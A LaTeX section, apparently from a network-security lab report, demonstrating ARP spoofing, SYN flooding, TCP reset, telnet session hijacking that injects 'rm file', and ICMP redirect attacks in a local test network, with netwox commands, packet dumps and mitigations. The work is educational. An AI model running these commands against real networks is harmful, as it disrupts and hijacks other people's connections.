@@ -1,0 +1,254 @@
+For this technical section three machines in a local network are considered: 
+\begin{itemize}
+\item Attacker with IP 10.0.2.4
+\item Client with IP 10.0.2.5
+\item Server with IP 10.0.2.6  
+\end{itemize}
+\subsection{ARP Spoofing attack}
+The address resolution protocol is used in local networks to map IP addresses to link layer addresses for packet routing. The protocol is designed to trust all received messages since a malicious user would need to first gain access to the local network. The ARP spoofing attack exploits this trust to create denial of service or man in the middle attacks against targeted hosts in a local network.
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={ARP Request packets },
+label={lst:arp_req},
+language=,
+frame=single]
+Ethernet________________________________________________________.
+| 08:00:27:0C:7A:B7->FF:FF:FF:FF:FF:FF type:0x0806              |
+|_______________________________________________________________|
+ARP Request_____________________________________________________.
+| this address : 08:00:27:0C:7A:B7 10.0.2.5                     |
+| asks         : 00:00:00:00:00:00 10.0.2.6                     |
+|_______________________________________________________________|
+\end{lstlisting}
+\end{minipage}
+When connecting from the client to the server the packet \lstref{lst:arp_req} is broadcast in the network so the attacker receives it as well. Responses to ARP requests are unicast and routed only to the request sender. The attacker can maliciously respond with spoofed ARP responses to received requests and poison the ARP tables of the request sender with the spoofed link layer addresses. This attack however would create a race condition with the authentic ARP response so the implemented attack utilises broadcasted ARP responses. This use of the ARP protocol can be used by hosts to announce their presence in the local network. 
+The attacker is made to periodically send ARP responses \lstref{lst:arp_spam} associating the server IP with a non-existing link layer address. This is accomplished with the command \lstref{lst:arp_attack} and results in the client unable to connect to the server after clearing the saved ARP table entry for the server IP. The connection is seen to hang \lstref{lst:arp_client} as the client tries to route the packets to non-existing link addresses.
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={ARP Response packets },
+label={lst:arp_spam},
+language=,
+frame=single]
+Ethernet________________________________________________________.
+| 00:01:01:01:01:01->FF:FF:FF:FF:FF:FF type:0x0806              |
+|_______________________________________________________________|
+ARP Reply_______________________________________________________.
+| this answer : 00:01:01:01:01:01 10.0.2.6                      |
+| is for      : FF:FF:FF:FF:FF:FF 0.0.0.0                       |
+|_______________________________________________________________|
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={ARP Spoof command },
+label={lst:arp_attack},
+language=,
+frame=single]
+$ netwox 80 -e "0:1:1:1:1:1" -i "10.0.2.6"
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Effect of ARP spoof on client },
+label={lst:arp_client},
+language=,
+frame=single]
+$ telnet 10.0.2.6 80
+Trying 10.0.2.6...
+\end{lstlisting}
+\end{minipage}
+
+The prerequisite for executing attacks on the ARP protocol would be to have access to the local network. This could have been problematic if it required physical cable access. Wireless networks thus are signinficantly more vulnerable. While ARP spoofing attacks can be powerful they can also be easily detected as the attack would need to constantly compete with authentic responses it generates a significant amount of network traffic. It can also be completely mitigated by using static ARP tables and ignoring ARP responses. For dynamic networks detection can also make use of DHCP messages to detect malicious ARP responses.
+
+\subsection{SYN Flood attack}
+The SYN flood attack is a denial of service attack against TCP servers. The attack exploits the fact that servers need to store information about hosts that have initiated a connection with a SYN packet while waiting for their ACK response to the sent SYN+ACK packet. This is implemented with a backlog buffer that discards the oldest entry when it gets full. The SYN flood attack would sent many SYN packets from spoofed IP addresses to the server and attempt to have genuine SYN packets discarded as the buffer fills up. \\
+The Attack is initiated using the command \lstref{lst:syn_attack} and results in packets like \lstref{lst:syn_packet} to be sent to the server with various spoofed IP and port numbers. The server is then flooded with connections in a state of received SYN packet which is partly seen in \lstref{lst:syn_server}. When the client tries to connect, the connection is never established.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={SYN flood attack command},
+label={lst:syn_attack},
+language=,
+frame=single]
+$ netwox 76 -i "10.0.2.6" -p "23"
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Connection status on the server},
+label={lst:syn_server},
+language=,
+frame=single]
+...
+tcp 0 0 10.0.2.6:23             246.78.59.143:24860     SYN_RECV   
+tcp 0 0 10.0.2.6:23             242.176.3.63:43508      SYN_RECV   
+tcp 0 0 10.0.2.6:23             251.73.8.232:30211      SYN_RECV   
+tcp 0 0 10.0.2.6:23             242.254.216.16:4535     SYN_RECV   
+tcp 0 0 10.0.2.6:23             241.228.0.77:8157       SYN_RECV   
+tcp 0 0 10.0.2.6:23             255.229.102.219:45059   SYN_RECV   
+tcp 0 0 10.0.2.6:23             246.227.145.38:23113    SYN_RECV 
+...
+\end{lstlisting}
+\end{minipage} 
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Example SYN packet },
+label={lst:syn_packet},
+language=,
+frame=single]
+Ethernet________________________________________________________.
+| 00:00:00:00:00:00->08:00:27:DA:E9:B1 type:0x0800              |
+|_______________________________________________________________|
+IP______________________________________________________________.
+|version|  ihl  |      tos      |            totlen             |
+|___4___|___5___|____0x00=0_____|___________0x0028=40___________|
+|              id               |r|D|M|       offsetfrag        |
+|_________0xA6B1=42673__________|0|0|0|________0x0000=0_________|
+|      ttl      |   protocol    |           checksum            |
+|___0x80=128____|____0x06=6_____|____________0xF2B4_____________|
+|                            source                             |
+|________________________46.169.102.187_________________________|
+|                          destination                          |
+|___________________________10.0.2.6____________________________|
+TCP_____________________________________________________________.
+|          source port          |       destination port        |
+|__________0x22A9=8873__________|___________0x0017=23___________|
+|                            seqnum                             |
+|_____________________0xFAA087A4=4204824484_____________________|
+|                            acknum                             |
+|_________________________0x00000000=0__________________________|
+| doff  |r|r|r|r|C|E|U|A|P|R|S|F|            window             |
+|___5___|0|0|0|0|0|0|0|0|0|0|1|0|__________0x05DC=1500__________|
+|           checksum            |            urgptr             |
+|_________0x6397=25495__________|___________0x0000=0____________|
+\end{lstlisting}
+\end{minipage}
+When the attack is executed with the server's syncookies feature on it fails to prevent the client from establishing a TCP connection. The syncookies feature allows for establishing a connection when an ACK packet is received without having the stored SYN packet information. This is achieved by encoding the time, required TCP options and a hash of client/server information in the sent sequence number of the server's SYN+ACK response. When the ACK response is received by the server all the required information and checks for establishing the connection can be obtained from the sequence number in the packet. \\
+Another available protection option that was disabled for this attack is having a larger SYN buffer. This can be somewhat helpful but is still defeated with enough malicious user bandwidth to the server. \\
+The final disabled defence would ignore packets that are received on interfaces that could not be connected to the IP address in the packet. This can be useful as the attack needs to spoof multiple IP addresses trying to establish a connection. In the NAT setup it is not useful as the network contains a gateway to the Internet. However it can be very beneficial for this defence to be implemented by the network routers. If this defence was enabled at the gateway of the network it would stop the attacker's spoofed packets from being routed to the server.
+
+\subsection{TCP reset}
+The TCP reset attack looks for clients trying to establish a TCP connection that matches certain rules and creates a spoofed TCP reset packet to terminate the connection and force the client and server to reestablish the TCP connection. A normal TCP 3-way handshake is seen in \lstref{lst:normal_tcp}. The attack is executed by the attacker with the command \lstref{lst:tcp_attack}. This would snoop sent packets that match a TCP SYN packet to port 23 and then send spoofed TCP reset packets to the client pretending to be the server and vice-versa. For the attacker to be able to observe SYN packets that are not intended for them promiscious mode needs to be enabled. This allows the interface to accepts all packets even if they should be ignored.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Normal client server TCP handshake},
+label={lst:normal_tcp},
+language=,
+frame=single]
+10.0.2.5 10.0.2.6 TCP 74 58625 > telnet [SYN] 
+10.0.2.6 10.0.2.5 TCP 74 telnet > 58625 [SYN, ACK] 
+10.0.2.5 10.0.2.6 TCP 66 58625 > telnet [ACK] 
+
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={TCP reset attack command},
+label={lst:tcp_attack},
+language=,
+frame=single]
+$ netwox 78 -f "port 23"
+\end{lstlisting}
+\end{minipage}
+
+When Trying to connect the server from the client the connection is forcibly closed by the spoofed reset packets. The result at the client is shown in \lstref{lst:tcp_client} and the TCP stream with the spoofed reset packets is \lstref{lst:tcp_stream}.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={TCP reset attack client view},
+label={lst:tcp_client},
+language=,
+frame=single]
+$ telnet 10.0.2.6
+Trying 10.0.2.6...
+Connected to 10.0.2.6.
+Escape character is '^]'.
+Connection closed by foreign host.
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={TCP reset attack packets},
+label={lst:tcp_stream},
+language=,
+frame=single]
+10.0.2.5 10.0.2.6 TCP 74 58626 > telnet [SYN] 
+10.0.2.6 10.0.2.5 TCP 74 telnet > 58626 [SYN, ACK] 
+10.0.2.5 10.0.2.6 TCP 66 58626 > telnet [ACK] 
+10.0.2.5 10.0.2.6 TELNET 90	Telnet Data ...
+10.0.2.6 10.0.2.5 TCP 66 telnet > 58626 [ACK] 
+10.0.2.6 10.0.2.5 TCP 54 telnet > 58626 [RST, ACK] 
+10.0.2.5 10.0.2.6 TCP 54 58626 > telnet [RST, ACK] 
+10.0.2.6 10.0.2.5 TCP 54 telnet > 58626 [RST, ACK] 
+10.0.2.6 10.0.2.5 TCP 54 telnet > 58626 [RST, ACK] 
+\end{lstlisting}
+\end{minipage}
+To narrow down the attack to preventing the server from connection to \emph{facebook.com} we first lookup the IP associated with that domain name which for this network is 31.13.92.36. We then start the attack but filter it to target TCP connections from the server IP to 31.13.92.36. The command for the attack is in \lstref{lst:facebook_attack} and it does achieve preventing only the server to connect to the website but not the client as well as allowing the server to connect to other websites.
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={TCP reset attack against server to facebook connections},
+label={lst:facebook_attack},
+language=,
+frame=single]
+$ netwox 78 -f "src host 10.0.2.6 and host 31.13.92.36"
+\end{lstlisting}
+\end{minipage}
+While TCP reset packets are intended to be helpful when a connection is disrupted and a host receives unwanted TCP data this technique can also clearly be used for denial of service and firewall filtering. To get around this a simple solution would be to have both connection endpoints not comply with TCP standard and drop Reset packets. This would work on the condition that both endpoints are also well behaved and would send limited amount of data before a response that could be easily dropped when its unwanted. 
+\subsection{TCP session hijacking}
+We establish a telnet session from the client to server and observe that single characters are sent and echoed back in plaintext. We also observe that the client sends a zero length ACK packet after server data transmission. It is also established that a single packet can contain multiple characters. To create a spoofed TCP packet and inject it into the stream we would need to set correct seq and ack numbers and pretend to be sending it from the client to the server. We can luckily reuse the seq and ack numbers from the last zero length TCP ACK packet sent form the client. Finally we encode the command "rm file" with a new line and send the spoofed packet \lstref{lst:spoof_tcp}.
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Command for a spoofed TCP packet},
+label={lst:spoof_tcp},
+language=,
+frame=single]
+netwox 40 -c "16" -l "10.0.2.5" -m "10.0.2.6" -o "58640" -p "23" 
+-q "1290285837" -r "3599268295" -H "726d2066696c650d0a"
+IP______________________________________________________________.
+|version|  ihl  |      tos      |            totlen             |
+|___4___|___5___|____0x10=16____|___________0x0031=49___________|
+|              id               |r|D|M|       offsetfrag        |
+|_________0x4A5B=19035__________|0|0|0|________0x0000=0_________|
+|      ttl      |   protocol    |           checksum            |
+|____0x00=0_____|____0x06=6_____|____________0x5852_____________|
+|                            source                             |
+|___________________________10.0.2.5____________________________|
+|                          destination                          |
+|___________________________10.0.2.6____________________________|
+TCP_____________________________________________________________.
+|          source port          |       destination port        |
+|_________0xE510=58640__________|___________0x0017=23___________|
+|                            seqnum                             |
+|_____________________0x4CE8330D=1290285837_____________________|
+|                            acknum                             |
+|_____________________0xD68879C7=3599268295_____________________|
+| doff  |r|r|r|r|C|E|U|A|P|R|S|F|            window             |
+|___5___|0|0|0|0|0|0|0|0|0|0|0|0|___________0x0000=0____________|
+|           checksum            |            urgptr             |
+|_________0x7716=30486__________|___________0x0000=0____________|
+72 6d 20 66  69 6c 65 0d  0a                        # rm file..
+\end{lstlisting}
+\end{minipage}
+
+This causes the established TCP connection to hang and enter into a loop of TCP resubmission as the client and server state machines have different seq and ack numbers. On terminating and reconnecting from the client we can observe that the created file is indeed deleted and the hijacking has been successful. While the connection disruption is not too different from the TCP reset attack the harm from injecting data into the TCP stream is evident from the command execution. To prevent such a harmful threat protocols that allow for at least message integrity and authenticity to be verified if the communication is not fully encrypted.
+
+\subsection{ICMP redirects}
+ICMP redirect packets are used by routers to change the gateway for specific hosts that is used by the connecting host. They can be used to reroute traffic to a man in the middle or create a denial of service by specifying an unresponsive gateway. We initiate an attack on the server by the attacker that looks for TCP packets that originate from the server and sends a spoofed ICMP redirect that changes the routing for the server from the default NAT gateway 10.0.2.1 to an invalid IP of 10.0.2.10. We use the command \lstref{lst:icmp_attack} and we observe that the routing rules for the server get updated \lstref{lst:icmp_change}. The initialised connection from the server then hangs and the server gets stuck sending ARP requests for the invalid IP of the new redirected gateway.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={ICMP redirect command},
+label={lst:icmp_attack},
+language=,
+frame=single]
+$ netwox 86 -f "src host 10.0.2.6 and tcp" -g "10.0.2.10" 
+-i "10.0.2.1"
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Specific host routing after redirect for server},
+label={lst:icmp_change},
+language=,
+frame=single]
+Source          Destination     Gateway
+....
+10.0.2.6        162.213.33.164  10.0.2.1      
+10.0.2.6        216.58.212.110  10.0.2.10     
+....
+\end{lstlisting}
+\end{minipage}
+For this attack to work two security features enabled by default were discarded. The first is accepting any ICMP redirects which easily prevents this attack. The second is in the event of enabled ICMP request only accept those that redirect to a gateway in the default gateway list. This is accomplished by the \emph{secure\_redirects} kernel option and is a viable solution when the network needs to be able to route differently and balance traffic.
